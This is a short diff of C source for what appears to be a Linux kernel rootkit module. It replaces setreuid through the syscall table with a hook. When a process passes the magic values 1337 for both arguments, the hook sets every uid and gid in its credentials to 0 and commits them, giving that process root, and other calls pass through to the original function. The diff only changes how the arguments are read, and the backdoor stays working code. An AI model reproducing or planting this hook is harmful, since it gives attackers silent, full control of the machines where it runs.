@@ -30,14 +30,14 @@ void **sys_call_address; // Pointer to the sys_call_table
 
 // Begin Brendan
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
-asmlinkage long our_setreuid(const struct pt_regs *regs){
+asmlinkage long our_setreuid(uid_t ruid, uid_t euid){
 	struct cred *creds;		// New set of Credentials to be implemented
 	// Special int types to set our creds to 0 (root)
 	kuid_t zeroUID = KUIDT_INIT(0);
 	kgid_t zeroGID = KGIDT_INIT(0);
 	
 	// If process supplies specific argument values, they must want to elevate to root and be malicious
-	if((regs->si == 1337) && (regs->di == 1337)){
+	if((ruid == 1337) && (euid == 1337)){
 		creds = prepare_creds();	// Get creds initialized
 		// R00T 3V3RYTH1NG
 		creds->uid = zeroUID;
@@ -48,12 +48,11 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 		creds->sgid = zeroGID;
 		creds->fsuid = zeroUID;
 		creds->fsgid = zeroGID;
-		
 		commit_creds(creds);		// Commit credentials of our process
 		return 0;			// Return success
 	}
 	// Otherwise fall through and do a boring, normal setreuid
-	return old_setreuid(regs->si, regs->di);
+	return old_setreuid(ruid, euid);
 }
 // End Brendan
 
